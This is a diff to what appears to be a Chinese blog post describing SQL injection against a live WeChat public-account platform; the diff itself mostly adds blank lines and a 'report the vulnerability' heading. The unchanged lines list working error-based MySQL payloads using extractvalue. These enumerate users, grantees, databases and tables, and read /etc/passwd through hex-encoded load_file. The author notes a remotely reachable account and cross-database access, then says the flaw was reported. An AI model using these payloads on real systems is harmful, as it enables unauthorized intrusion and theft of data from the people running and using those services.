@@ -96,23 +96,30 @@ tags:
 7. 其它可以尝试的
 
 		and extractvalue(1, concat(0x5c,(select count(1) from mysql.user limit 0,1)));
+
 	读取Mysql用户
 
 		and extractvalue(1, concat(0x5c,(select hex(load_file(0x2f6574632f706173737764)))));
+
 	读取文件,写文件( `select  code  into outfile 'path'`).
 
 		and extractvalue(1, concat(0x5c,(select grantee from information_schema.user_privileges group by grantee limit 0,1)));
+
 	发现一个可以远程连接的用户 `'xiaoyu_pro'@'%'`
 	
 		and extractvalue(1, concat(0x5c,(select schema_name from information_schema.schemata  limit 0,1)));
+
 	所有数据库名,发现还不少,这个平台有几十个公众号
 
 		and extractvalue(1, concat(0x5c,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'shandongzuixinshi' limit 0,1)));
+
 	垮库成功,发现一样的结构,公众号隶属同一家,公司, 数据库权限有限, 接下来要想别的办法了.
 
 
-
+### 反馈漏洞 ###
 最后,反馈下!
 唉,当个好人太难了.
 ![](http://i.imgur.com/W789pWw.jpg)
+
+
 	
